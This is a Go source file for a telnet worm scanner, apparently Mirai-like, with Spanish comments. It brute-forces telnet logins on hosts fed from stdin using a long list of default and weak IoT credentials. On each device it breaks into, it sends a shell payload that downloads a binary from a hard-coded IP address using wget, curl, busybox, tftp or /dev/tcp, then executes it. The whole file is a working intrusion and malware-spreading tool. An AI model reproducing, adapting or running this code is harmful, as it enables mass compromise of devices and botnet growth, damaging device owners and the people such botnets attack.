package main

import (
	"bufio"
	"bytes"
	"fmt"
	"net"
	"os"
	"runtime"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Credenciales REALES usadas en sistemas 2020-2026
var CREDENTIALS = []struct {
	Username string
	Password string
}{
	// TOP 20 - Las más encontradas en sistemas reales
	{"root", "123456"},
	{"root", "password"},
	{"root", "12345678"},
	{"admin", "admin"},
	{"root", "admin"},
	{"admin", "123456"},
	{"root", "root"},
	{"admin", "password"},
	{"root", "12345"},
	{"root", "123456789"},
	{"admin", "12345"},
	{"root", "1234"},
	{"admin", "1234"},
	{"root", "1234567890"},
	{"admin", "12345678"},
	{"root", "qwerty"},
	{"admin", "admin123"},
	{"root", "admin123"},
	{"admin", "qwerty"},
	{"root", "passw0rd"},
	
	// Defaults de fabricantes
	{"ubnt", "ubnt"},
	{"pi", "raspberry"},
	{"root", "vizxv"},
	{"root", "xc3511"},
	{"root", "anko"},
	{"admin", "1234"},
	{"admin", "password"},
	{"cisco", "cisco"},
	{"enable", "cisco"},
	{"root", "toor"},
	{"root", "alpine"},
	{"root", "changeme"},
	{"admin", "default"},
	{"root", "default"},
	{"support", "support"},
	{"user", "user"},
	{"guest", "guest"},
	{"root", ""},
	{"admin", ""},
	{"root", "root123"},
	{"root", "dreambox"},
	{"root", "recorder"},
	{"root", "hikvision"},
	{"admin", "hikvision"},
	{"root", "pass"},
	{"admin", "meinsm"},
	{"root", "Zte521"},
	{"admin", "Admin"},
	{"root", "Admin"},
	{"Administrator", "password"},
	{"root", "1qaz2wsx"},
	{"root", "q1w2e3r4"},
	{"admin", "1qaz2wsx"},
	{"root", "111111"},
	{"root", "000000"},
	{"root", "123123"},
	{"root", "123321"},
	{"admin", "111111"},
	{"admin", "000000"},
	{"root", "654321"},
	{"root", "666666"},
	{"root", "888888"},
	{"root", "klv123"},
	{"root", "7ujMko0admin"},
	{"root", "7ujMko0vizxv"},
	{"root", "system"},
	{"admin", "system"},
	{"root", "manager"},
	{"admin", "manager"},
	{"root", "super"},
	{"admin", "super"},
	{"root", "2020"},
	{"root", "2021"},
	{"root", "2022"},
	{"root", "2023"},
	{"root", "2024"},
	{"root", "2025"},
	{"root", "2026"},
	{"admin", "2024"},
	{"root", "Password2024"},
	{"root", "Admin2024"},
	{"root", "letmein"},
	{"root", "monkey"},
	{"root", "dragon"},
	{"root", "baseball"},
	{"root", "football"},
	{"root", "master"},
}

const (
	TELNET_TIMEOUT    = 5 * time.Second
	MAX_WORKERS       = 2000
	STATS_INTERVAL    = 1 * time.Second
	MAX_QUEUE_SIZE    = 100000
	CONNECT_TIMEOUT   = 3 * time.Second
)

// Payload con MÚLTIPLES métodos de descarga para compatibilidad con sistemas viejos
const PAYLOAD = `cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; 
a=$(uname -m); 
case $a in 
    x86_64) b="x86_64";; 
    i?86) b="x86";; 
    armv7l) b="arm7";; 
    armv6l) b="arm6";; 
    armv5l) b="arm5";; 
    aarch64) b="aarch64";; 
    mips) b="mips";; 
    mipsel) b="mipsel";; 
    *) b="x86_64";; 
esac; 
url="http://172.96.140.62:1283/bins/$b"; 
if command -v wget >/dev/null 2>&1; then 
    wget -q $url -O .x && chmod +x .x && ./.x & 
elif command -v curl >/dev/null 2>&1; then 
    curl -s $url -o .x && chmod +x .x && ./.x & 
elif command -v busybox >/dev/null 2>&1; then 
    busybox wget -q $url -O .x && chmod +x .x && ./.x & 
elif command -v fetch >/dev/null 2>&1; then 
    fetch -q $url -o .x && chmod +x .x && ./.x & 
elif command -v ftpget >/dev/null 2>&1; then 
    ftpget -u anonymous -p anonymous 172.96.140.62 $url .x && chmod +x .x && ./.x & 
elif command -v tftp >/dev/null 2>&1; then 
    tftp -g -r bins/$b 172.96.140.62 -l .x && chmod +x .x && ./.x & 
else
    # Último recurso - shell puro
    exec 3<>/dev/tcp/172.96.140.62/1283 && echo -e "GET /bins/$b HTTP/1.0\r\nHost: 172.96.140.62\r\n\r\n" >&3 && cat <&3 > .x && chmod +x .x && ./.x &
fi`

type CredentialResult struct {
	Host     string
	Username string
	Password string
	Output   string
}

type TelnetScanner struct {
	lock             sync.Mutex
	scanned          int64
	valid            int64
	invalid          int64
	foundCredentials []CredentialResult
	hostQueue        chan string
	done             chan bool
	wg               sync.WaitGroup
	queueSize        int64
}

func NewTelnetScanner() *TelnetScanner {
	runtime.GOMAXPROCS(runtime.NumCPU())
	
	return &TelnetScanner{
		hostQueue:        make(chan string, MAX_QUEUE_SIZE),
		done:             make(chan bool),
		foundCredentials: make([]CredentialResult, 0),
	}
}

func (s *TelnetScanner) tryLogin(host, username, password string) (bool, interface{}) {
	dialer := &net.Dialer{
		Timeout: CONNECT_TIMEOUT,
	}
	conn, err := dialer.Dial("tcp", host+":23")
	if err != nil {
		return false, "connection failed"
	}
	defer conn.Close()

	err = conn.SetDeadline(time.Now().Add(TELNET_TIMEOUT))
	if err != nil {
		return false, "deadline error"
	}

	promptCheck := func(data []byte, prompts ...[]byte) bool {
		for _, prompt := range prompts {
			if bytes.Contains(data, prompt) {
				return true
			}
		}
		return false
	}

	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	loginPrompts := [][]byte{[]byte("login:"), []byte("Login:"), []byte("username:"), []byte("Username:")}
	
	startTime := time.Now()
	for !promptCheck(data, loginPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "login prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(username + "\n"))
	if err != nil {
		return false, "write username failed"
	}

	data = data[:0]
	passwordPrompts := [][]byte{[]byte("Password:"), []byte("password:")}
	
	startTime = time.Now()
	for !promptCheck(data, passwordPrompts...) {
		if time.Since(startTime) > TELNET_TIMEOUT {
			return false, "password prompt timeout"
		}
		
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}

	_, err = conn.Write([]byte(password + "\n"))
	if err != nil {
		return false, "write password failed"
	}

	data = data[:0]
	shellPrompts := [][]byte{[]byte("$ "), []byte("# "), []byte("> "), []byte("sh-"), []byte("bash-")}
	
	startTime = time.Now()
	for time.Since(startTime) < TELNET_TIMEOUT {
		conn.SetReadDeadline(time.Now().Add(500 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			conn.Write([]byte("\n"))
			continue
		}
		data = append(data, buf[:n]...)
		
		if promptCheck(data, shellPrompts...) {
			conn.SetWriteDeadline(time.Now().Add(TELNET_TIMEOUT))
			_, err = conn.Write([]byte(PAYLOAD + "\n"))
			if err != nil {
				return false, "write command failed"
			}
			output := s.readCommandOutput(conn)
			return true, CredentialResult{
				Host:     host,
				Username: username,
				Password: password,
				Output:   output,
			}
		}
	}
	return false, "no shell prompt"
}

func (s *TelnetScanner) readCommandOutput(conn net.Conn) string {
	data := make([]byte, 0, 1024)
	buf := make([]byte, 1024)
	startTime := time.Now()
	readTimeout := TELNET_TIMEOUT / 2

	for time.Since(startTime) < readTimeout {
		conn.SetReadDeadline(time.Now().Add(300 * time.Millisecond))
		n, err := conn.Read(buf)
		if err != nil || n == 0 {
			continue
		}
		data = append(data, buf[:n]...)
	}
	
	if len(data) > 0 {
		return string(data)
	}
	return ""
}

func (s *TelnetScanner) worker() {
	defer s.wg.Done()

	for host := range s.hostQueue {
		atomic.AddInt64(&s.queueSize, -1)
		
		found := false
		if host == "" {
			continue
		}
		
		for _, cred := range CREDENTIALS {
			success, result := s.tryLogin(host, cred.Username, cred.Password)
			if success {
				atomic.AddInt64(&s.valid, 1)
				
				credResult := result.(CredentialResult)
				s.lock.Lock()
				s.foundCredentials = append(s.foundCredentials, credResult)
				s.lock.Unlock()
				
				fmt.Printf("\n[+] FOUND: %s | %s:%s\n", credResult.Host, credResult.Username, credResult.Password)
				fmt.Printf("[*] Payload sent to %s (multi-method)\n\n", credResult.Host)
				
				found = true
				break
			}
		}

		if !found {
			atomic.AddInt64(&s.invalid, 1)
		}
		atomic.AddInt64(&s.scanned, 1)
	}
}

func (s *TelnetScanner) statsThread() {
	ticker := time.NewTicker(STATS_INTERVAL)
	defer ticker.Stop()

	for {
		select {
		case <-s.done:
			return
		case <-ticker.C:
			scanned := atomic.LoadInt64(&s.scanned)
			valid := atomic.LoadInt64(&s.valid)
			invalid := atomic.LoadInt64(&s.invalid)
			queueSize := atomic.LoadInt64(&s.queueSize)
			
			fmt.Printf("\r📊 Scanned: %d | ✅ Valid: %d | ❌ Invalid: %d | 📥 Queue: %d | 🧵 Routines: %d", 
				scanned, valid, invalid, queueSize, runtime.NumGoroutine())
		}
	}
}

func (s *TelnetScanner) Run() {
	fmt.Println("🔥 Telnet Scanner 2020-2026 - Multi-Method Payload")
	fmt.Printf("⚙️  Workers: %d | Queue: %d | Timeout: %v\n", MAX_WORKERS, MAX_QUEUE_SIZE, TELNET_TIMEOUT)
	fmt.Printf("📦 Compatible con: wget, curl, busybox, fetch, ftpget, tftp, /dev/tcp\n\n")
	
	go s.statsThread()

	stdinDone := make(chan bool)
	
	go func() {
		reader := bufio.NewReader(os.Stdin)
		hostCount := 0
		
		for {
			line, err := reader.ReadString('\n')
			if err != nil {
				break
			}
			
			host := strings.TrimSpace(line)
			if host != "" {
				atomic.AddInt64(&s.queueSize, 1)
				hostCount++
				
				select {
				case s.hostQueue <- host:
				default:
					time.Sleep(10 * time.Millisecond)
					s.hostQueue <- host
				}
			}
		}
		
		fmt.Printf("\n📥 Hosts cargados: %d\n", hostCount)
		stdinDone <- true
	}()

	for i := 0; i < MAX_WORKERS; i++ {
		s.wg.Add(1)
		go s.worker()
	}

	<-stdinDone
	
	close(s.hostQueue)
	s.wg.Wait()
	s.done <- true

	scanned := atomic.LoadInt64(&s.scanned)
	valid := atomic.LoadInt64(&s.valid)
	
	fmt.Println("\n\n✅ SCAN COMPLETADO")
	fmt.Printf("📊 Total escaneados: %d\n", scanned)
	fmt.Printf("✅ Credenciales válidas: %d\n", valid)
	
	if len(s.foundCredentials) > 0 {
		fmt.Println("\n🔑 Credenciales encontradas:")
		for _, cred := range s.foundCredentials {
			fmt.Printf("   • %s | %s:%s\n", cred.Host, cred.Username, cred.Password)
		}
	}
}

func main() {
	fmt.Println("╔════════════════════════════════════════╗")
	fmt.Println("║     SHIFT/RIVEN TELNET SCANNER         ║")
	fmt.Println("║        Multi-Method Payload            ║")
	fmt.Println("║      Compatible with old systems       ║")
	fmt.Println("╚════════════════════════════════════════╝")
	fmt.Printf("CPU Cores: %d\n\n", runtime.NumCPU())
	
	scanner := NewTelnetScanner()
	scanner.Run()
}
